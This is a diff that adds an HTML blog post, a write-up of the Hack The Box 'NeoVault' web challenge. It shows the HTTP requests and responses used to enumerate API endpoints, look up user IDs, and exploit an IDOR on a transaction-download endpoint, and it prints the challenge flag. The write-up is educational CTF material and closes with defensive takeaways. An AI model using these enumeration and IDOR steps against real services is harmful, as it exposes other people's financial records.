@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HTB NeoVault Challenge Writeup - GhostFlagged Blog</title>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="container">
+    <!-- Sidebar -->
+    <aside class="sidebar">
+      <div class="profile-section">
+        <div class="profile-pic">
+          <img src="../033c6a1e8ca3ad18b0e6ac169604c66b.jpg" alt="Profile Picture" id="profile-img">
+        </div>
+        <h1>GhostFlagged</h1>
+        <p class="tagline">My personal space for writing and sharing ideas.</p>
+      </div>
+      
+      <div class="contact-section">
+        <h3>Contact</h3>
+        <a href="mailto:your.email@example.com" class="email-link">your.email@example.com</a>
+      </div>
+
+      <nav class="sidebar-nav">
+        <a href="../index.html#posts" class="nav-link">Posts</a>
+        <a href="../index.html#projects" class="nav-link">Projects</a>
+      </nav>
+
+      <footer class="sidebar-footer">
+        <p>&copy; 2025 GhostFlagged</p>
+      </footer>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="main-content">
+      <article class="post-content">
+        <a href="../index.html" class="back-link">← Back to Home</a>
+        <div class="post-title-header">
+          <span class="post-category category-ctf">CTF</span>
+          <h1>HTB NeoVault Challenge Writeup</h1>
+        </div>
+        <p class="post-meta">Published on January 2025</p>
+        <div class="post-body">
+          <p>NeoVault is a secure banking application for transferring funds and viewing transaction history. In this challenge, you're asked to examine the application, find potential vulnerabilities, and extract the hidden flag.</p>
+
+          <h2>How I Solved It</h2>
+          
+          <p>I started by examining the application's user interface and testing all its features. Once the client-side review was complete, I analyzed the application's traffic using Burp Suite. The first thing that caught my attention was this request:</p>
+
+          <pre class="code-block"><code>GET /api/v2/transactions?page=1&limit=5 HTTP/1.1
+Host: [REDACTED_IP]:[PORT]
+Cookie: token=...</code></pre>
+
+          <p>And the server's response was:</p>
+
+          <pre class="code-block"><code>{
+  "transactions": [
+    {
+      "_id": "...",
+      "fromUser": {
+        "_id": "688e028bf7c91f49ff773900",
+        "username": "neo_system"
+      },
+      "toUser": {
+        "_id": "...",
+        "username": "admin123"
+      },
+      "amount": 100,
+      "description": "Welcome bonus credit"
+    }
+  ]
+}</code></pre>
+
+          <p>Here I discovered that a user named <code>neo_system</code> had deposited an amount into my account.</p>
+
+          <h2>Examining the Deposit Endpoint in API v2</h2>
+          
+          <p>During further investigation, I came across the following deposit endpoint:</p>
+
+          <pre class="code-block"><code>POST /api/v2/transactions/deposit HTTP/1.1
+Host: [REDACTED_IP]:[PORT]
+Content-Type: application/json
+Cookie: token=...
+
+{"amount":688888888}</code></pre>
+
+          <p>However, the server's response was:</p>
+
+          <pre class="code-block"><code>{
+  "message": "Under maintenance",
+  "error": "v2 version is under maintenance"
+}</code></pre>
+
+          <p>This indicated that this version of the API was inactive.</p>
+
+          <h2>Finding API v1 Endpoints</h2>
+          
+          <p>By examining the application's JavaScript files (which had a Next.js structure), I found the following endpoints:</p>
+
+          <pre class="code-block"><code>endpointsV1: {
+    me: "/api/v1/auth/me",
+    login: "/api/v1/auth/login",
+    register: "/api/v1/auth/register",
+    logout: "/api/v1/auth/logout",
+    changeEmail: "/api/v1/auth/change-email",
+    transactions: "/api/v1/transactions",
+    deposit: "/api/v1/transactions/deposit",
+    balanceHistory: "/api/v1/transactions/balance-history",
+    categoryPercentages: "/api/v1/transactions/categories-spending",
+    downloadTransactions: "/api/v1/transactions/download-transactions"
+}</code></pre>
+
+          <p>Most of these endpoints were inactive, but the <code>/api/v1/transactions/download-transactions</code> endpoint was active and required a user ID.</p>
+
+          <h2>Getting the neo_system User ID</h2>
+          
+          <p>To retrieve the user's <code>_id</code>, I used this endpoint:</p>
+
+          <pre class="code-block"><code>GET /api/v2/auth/inquire?username=neo_system HTTP/1.1</code></pre>
+
+          <p>And received this response:</p>
+
+          <pre class="code-block"><code>{
+  "_id": "688e028bf7c91f49ff773905",
+  "username": "neo_system"
+}</code></pre>
+
+          <h2>First PDF – Discovering the Hidden User</h2>
+          
+          <p>Now with this ID, I sent the following request to the download transactions endpoint:</p>
+
+          <pre class="code-block"><code>POST /api/v1/transactions/download-transactions HTTP/1.1
+Host: [REDACTED_IP]:[PORT]
+Content-Type: application/json
+Cookie: token=...
+
+{
+  "_id": "688e028bf7c91f49ff773905",
+  "username": "neo_system"
+}</code></pre>
+
+          <p>The output of this request was a PDF file showing transactions related to the <code>neo_system</code> user. In that file, I noticed the existence of a user named <code>user_with_flag</code> that wasn't visible anywhere in the UI:</p>
+
+          <pre class="code-block"><code>Date        From           To                Description                  Amount
+8/2/2025    admin123       neo_system        KosNanat                     1.00
+8/2/2025    admin123       neo_system        KosNanat                     1.00
+8/2/2025    admin123       neo_system        KosNanat                     0.01
+8/2/2025    admin123       neo_system        KosNanat                     1.00
+8/2/2025    neo_system     admin1234         Welcome bonus credit         100.00
+8/2/2025    neo_system     admin123          Welcome bonus credit         100.00
+7/26/2025   neo_system     user_with_flag    Welcome bonus credit         1337.00</code></pre>
+
+          <h2>Getting the user_with_flag ID and Retrieving the Flag</h2>
+          
+          <p>Knowing the username <code>user_with_flag</code>, I used the inquire endpoint again:</p>
+
+          <pre class="code-block"><code>GET /api/v2/auth/inquire?username=user_with_flag HTTP/1.1</code></pre>
+
+          <p>And obtained their ID. Then, using the same download transactions endpoint, I requested information for the <code>user_with_flag</code> user:</p>
+
+          <pre class="code-block"><code>{
+  "_id": "688e02abc1234567890abcdef",
+  "username": "user_with_flag"
+}</code></pre>
+
+          <p>In the received PDF file, I found the flag in the transactions:</p>
+
+          <pre class="code-block"><code>Date        From             To              Description                  Amount
+7/26/2025   user_with_flag   user_with_flag  HTB{n0t_s0_3asy_1d0r}        -
+7/26/2025   neo_system       user_with_flag  Welcome bonus credit         1337.00</code></pre>
+
+          <h2>Conclusion</h2>
+          
+          <p>By exploiting the weakness in ID validation and lack of proper access control on the <code>download-transactions</code> endpoint, I successfully retrieved two PDF files—one containing hidden information and the second containing the final flag:</p>
+
+          <pre class="code-block"><code>HTB{n0t_s0_3asy_1d0r}</code></pre>
+
+          <h2>Key Takeaways</h2>
+          
+          <ul>
+            <li><strong>Insecure Direct Object Reference (IDOR):</strong> The application allowed users to download transaction PDFs for any user by simply providing their user ID, without proper authorization checks.</li>
+            <li><strong>Information Disclosure:</strong> The API v2 transactions endpoint leaked information about system users that weren't visible in the UI.</li>
+            <li><strong>Missing Access Controls:</strong> The <code>download-transactions</code> endpoint didn't verify that the requesting user had permission to access the requested user's data.</li>
+          </ul>
+        </div>
+      </article>
+    </main>
+  </div>
+</body>
+</html>
+
